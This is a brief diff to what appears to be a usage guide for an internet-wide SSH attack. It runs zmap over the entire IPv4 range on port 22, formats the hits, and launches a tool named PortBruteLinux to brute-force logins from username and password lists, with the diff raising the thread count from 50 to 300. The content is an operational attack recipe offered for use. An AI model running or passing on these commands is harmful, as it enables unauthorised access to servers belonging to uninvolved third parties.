@@ -38,7 +38,7 @@ nohup zmap -p 22 0.0.0.0/0 -N 5000 -o ssh.txt > zmap.log &
 sed -i 's/$/:22|SSH/' ssh.txt
 
 ### 开始
-nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 50 -u user.txt > PortBruteLinux.log &
+nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 300 -u user.txt > PortBruteLinux.log &
 
 tail -f PortBruteLinux.log
 
